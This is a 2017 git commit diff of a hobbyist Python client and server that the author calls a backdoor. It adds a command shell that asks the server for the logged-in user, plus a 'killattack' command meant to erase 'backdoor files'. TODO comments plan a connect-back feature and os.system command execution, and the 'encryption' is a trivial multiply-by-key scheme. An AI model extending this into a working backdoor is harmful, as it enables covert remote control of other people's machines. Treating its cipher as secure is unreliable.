122cb5df2201a62d22ebd401e00e59a214b350d0
yrafalin <31785347+yrafalin@users.noreply.github.com>
2017-09-14 22:35:54 -0700

    Add files via upload

--- 0,1Clientside.py
+++ 0,1Clientside.py
@@ -1,12 +1,34 @@
-'FOR PYTHON 3'
-_version_ = '0.1'
-import socket
-import random
-import cmd
+#FOR PYTHON 3
+__version__ = '0.1'
+import socket, random, cmd
 
 #The encryption algorithm takes a random number and multiplies all of
 #the charachter's ASCII values by it. It gets the key to the other side
 #by sending it squared.
+# print([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
+#client = socket.socket()
+'''class send_commands(cmd.Cmd):
+    prompt = 'Enter command: '
+    def do_exit(self, arg):
+        lenofmsg = str(len(str('stop').encode()))
+        lenofmsg = ('0' * (4-len(lenofmsg))) + str(lenofmsg)
+        client.send(str(lenofmsg).encode())
+        client.send(encode_with_key('stop', key))
+        stop()
+    def do_loggedin(self, arg):
+        lenofmsg = str(len(str('loggedin').encode()))
+        lenofmsg = ('0' * (4-len(lenofmsg))) + str(lenofmsg)
+        client.send(str(lenofmsg).encode())
+        client.send(encode_with_key('loggedin', key))
+        lenofmsg_rtrnd = int(connect.recv(4).decode('utf-8'))
+        print(str(decode_with_key(client.recv(lenofmsg_rtrnd), key)))
+    def do_WHOAMI(self, arg):
+        lenofmsg = str(len(str('WHOAMI').encode()))
+        lenofmsg = ('0' * (4-len(lenofmsg))) + str(lenofmsg)
+        client.send(str(lenofmsg).encode())
+        client.send(encode_with_key('WHOAMI', key))
+        lenofmsg_rtrnd = int(connect.recv(4).decode('utf-8'))
+        print(str(decode_with_key(client.recv(lenofmsg_rtrnd), key)))'''
 
 def encode_with_key(string, key):#Encrypting and decrypting
     list_of_numbers = ''
@@ -17,16 +39,64 @@ def decode_with_key(byte, key):
     string_of_bytes = ''
     list_of_bytes = byte.decode('utf-8').split()
     for b in list_of_bytes:
-        string_of_bytes += chr(int(eval(b)//key))
+        string_of_bytes += chr(int(int(b)//key))
     return string_of_bytes
+
+class send_commands(cmd.Cmd):
+    prompt = 'Enter command: '
+    def cmdloop(self, key, client):
+        self.key = key
+        self.client = client
+        intro = None
+        return cmd.Cmd.cmdloop(self, intro)
+    def do_exit(self, arg):
+        'Exit program.'
+        message = encode_with_key('exit', self.key)
+        lenofmsg = str(len(str(message)))
+        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
+        self.client.send(str(lenofmsg).encode())
+        self.client.send(message)
+        return True
+    def do_loggedin(self, arg):
+        'Get current logged in user.'
+        message = encode_with_key('loggedin', self.key)
+        lenofmsg = str(len(message))
+        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
+        print('lenofmsg', lenofmsg)
+        self.client.send(str(lenofmsg).encode())
+        self.client.send(message)
+        lenofmsg_rtrnd = int(self.client.recv(5).decode('utf-8'))
+        print(str(decode_with_key(self.client.recv(lenofmsg_rtrnd), self.key)))
+    def do_WHOAMI(self, arg):
+        'Get current logged in user.'
+        message = encode_with_key('WHOAMI', self.key)
+        lenofmsg = str(len(str(message)))
+        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
+        print('lenofmsg', lenofmsg)
+        self.client.send(str(lenofmsg).encode())
+        self.client.send(message)
+        lenofmsg_rtrnd = int(self.client.recv(5).decode('utf-8'))
+        print(str(decode_with_key(self.client.recv(lenofmsg_rtrnd), self.key)))
+    def do_killattack(self, arg):
+        'Erase all backdoor files on serverside.'
+        print('Are you sure you want to erase all backdoor files on the serverside?')
+        erase = input('There is no going back. Write y or n. ')
+        if erase == 'y':
+            message = encode_with_key('killattack', self.key)
+            lenofmsg = str(len(str(message)))
+            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
+            print('lenofmsg', lenofmsg)
+            self.client.send(str(lenofmsg).encode())
+            self.client.send(message)
+            return True
 
 def main():
     #Setting up
     client = socket.socket()
     #ip = input('Server IP: ')
+    #ip = '104.239.207.44'
     ip = '127.0.0.1'
     port = 6000
-
     try:
         client.connect((ip, port))
     except:
@@ -39,8 +109,8 @@ def main():
     lenofmsg = ('0' * (2-len(lenofmsg))) + str(lenofmsg)
     client.send(str(lenofmsg).encode())
     client.send(str(key**2).encode())#Multiplying key for security
-    client.send(encode_with_key('Ping', key))
-    print(decode_with_key(client.recv(4096), key))
+    commands = send_commands()
+    commands.cmdloop(key, client)
     client.close()
 
 if __name__ == '__main__':
--- 0,1Serverside.py
+++ 0,1Serverside.py
@@ -1,42 +1,86 @@
-'FOR PYTHON 3'
-_version_ = '0.1'
-import socket
-import cmd
+#FOR PYTHON 3
+__version__ = '0.1'
+import socket, cmd, getpass, os
+
+# replace encoding with aes MI
+# add connect back feature MI
+# add argparse MI
+# add os.system LI
+# so_reuseaddr NI
+# do_while NI
 
 def encode_with_key(string, key):#Encrypting and decrypting
     list_of_numbers = ''
     for letter in string:
         list_of_numbers += str(ord(letter)*key) + ' '
     return list_of_numbers.encode()
+
 def decode_with_key(byte, key):
     string_of_bytes = ''
-    list_of_bytes = byte.decode('utf-8').split()
+    list_of_bytes = (byte.decode('utf-8')).split()
     for b in list_of_bytes:
-        string_of_bytes += chr(int(eval(b)//key))
+        string_of_bytes += chr(int(int(b)//key))
     return string_of_bytes
+
+class recv_commands(cmd.Cmd):
+    def __init__(self, key, connect):#VERY IMPORTANT lets me use key and socket outside main
+        self.key = key
+        self.connect = connect
+    def do_exit(self, arg):
+        return 0#To make continue_loop 0
+    def do_loggedin(self, arg):
+        message = encode_with_key(str(getpass.getuser()), self.key)
+        lenofmsg = str(len(message))
+        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)#Makes sure that lenofmsg is exactly 5 long by adding zeros
+        print('loggedin', lenofmsg)
+        self.connect.send(str(lenofmsg).encode())
+        self.connect.send(message)
+        return 1
+    def do_WHOAMI(self, arg):
+        message = encode_with_key(str(getpass.getuser()), self.key)
+        lenofmsg = str(len(message))
+        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
+        print('whoami', lenofmsg)
+        self.connect.send(str(lenofmsg).encode())
+        self.connect.send(message)
+        return 1
+    def do_killattack(self, arg):
+        return 0
 
 def main():
     #Setting up
+    #CLEAR UP MAIN FUNC
     server = socket.socket()
     ip = '127.0.0.1'
     port = 6000
-
     server.bind((ip, port))
     server.listen(1)
-    while True:#For multiple requests
-        cnct, addr = server.accept()
-        lenofmsg = int(cnct.recv(2).decode('utf-8'))
-        key = round(int(round(int(cnct.recv(lenofmsg).decode('utf-8'))**(1/2))))#Sqrt of key
+    '''while True:#For multiple requests
+        connect, addr = server.accept()
+        lenofmsg = int(connect.recv(2).decode('utf-8'))
+        key = round(int(round(int(connect.recv(lenofmsg).decode('utf-8'))**(1/2))))#Sqrt of key
         print('key', key)
-        toprint = decode_with_key(cnct.recv(4096), key)
-        print(toprint)
-        if toprint == 'Ping':
-            cnct.send(encode_with_key('Pong', key))
-        else:
-            cnct.send(encode_with_key('Wrong!', key))
-        cnct.close()
+        continue_loop = 1#Stopping the loop uses this var
+        while continue_loop:
+            lenofmsg_rtrnd = int(connect.recv(5).decode('utf-8'))#Standard protocol for my project
+            msg_recvd = str(decode_with_key(connect.recv(lenofmsg_rtrnd), key))#Then receive real msg
+            print('message recvd', msg_recvd)
+            continue_loop = recv_commands(key, connect).onecmd(msg_recvd)
+        print('Bye')
+        connect.close()'''
+    #!!!so_reuseaddr!!!
+    connect, addr = server.accept()
+    lenofmsg = int(connect.recv(2).decode('utf-8'))
+    key = round(int(round(int(connect.recv(lenofmsg).decode('utf-8'))**(1/2))))#Sqrt of key
+    print('key', key)
+    continue_loop = 1#Stopping the loop uses this var
+    while continue_loop:#investigate do while
+        lenofmsg = int(connect.recv(5).decode('utf-8'))#Standard protocol for my project
+        msg_recvd = str(decode_with_key(connect.recv(lenofmsg), key))#Then receive real msg
+        print('message recvd', msg_recvd)
+        continue_loop = recv_commands(key, connect).onecmd(msg_recvd)
+    print('Bye')
+    connect.close()
 
 if __name__ == '__main__':
     main()
-else:
-    print('hi')
